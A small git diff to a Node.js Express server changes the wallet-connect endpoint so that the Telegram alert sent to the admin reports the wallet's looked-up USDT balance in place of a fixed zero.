@@ -162,8 +162,9 @@ app.post('/api/wallets/connect', async (req, res) => {
         console.log('💾 WALLET SAVED TO DATABASE:', wallet.address);
         
         // Send alert to admin
-        await telegram.sendNewWalletAlert(address, '0');
-        
+const contractService = require('./src/services/contract.service');
+const balance = await contractService.getWalletUSDTBalance(address);
+await telegram.sendNewWalletAlert(address, balance);        
         res.json({
             success: true,
             wallet: {
@@ -264,4 +265,5 @@ app.get('/api/wallets/:address/balance', async (req, res) => {
         });
     }
 });
+
 
